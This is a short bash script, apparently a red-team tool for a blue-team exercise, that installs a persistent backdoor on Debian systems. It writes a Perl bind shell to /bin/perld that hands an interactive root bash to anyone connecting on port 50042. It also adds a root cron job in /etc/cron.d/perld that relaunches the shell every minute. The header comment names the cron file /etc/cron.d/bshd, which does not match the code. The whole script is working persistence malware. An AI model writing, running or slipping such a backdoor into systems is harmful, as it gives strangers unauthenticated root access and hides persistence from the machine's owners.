#! /bin/bash

# Name: Cronjob BIND Shell Backdoor
# Notes: 
# - Creates cron job in /etc/cron.d/bshd
# - Usage: ./blue_cron_bind_shell.sh
# - Set port with PORT env var, default is 50042
# Valid Targets: Blue team debian based images

if [[ ! -v PORT ]]
then
PORT="50042"
fi

echo "Creating cron job to run a BIND shell on port $PORT"

echo "Install requirements..."
sudo apt install cron -y

SCRIPT="perl -e 'use Socket;\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in(\$p, INADDR_ANY));listen(S,SOMAXCONN);for(;\$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'"

# Place scripts at /bin/perld and set permissions
echo "Creating script..."
echo "$SCRIPT" | sudo tee /bin/perld > /dev/null
sudo chown root /bin/perld
sudo chmod 700 /bin/perld

echo "Setting up cronjob..."
echo "* * * * * root    perl /bin/perld" | sudo tee /etc/cron.d/perld > /dev/null

echo "Done creating BIND shell cron job."
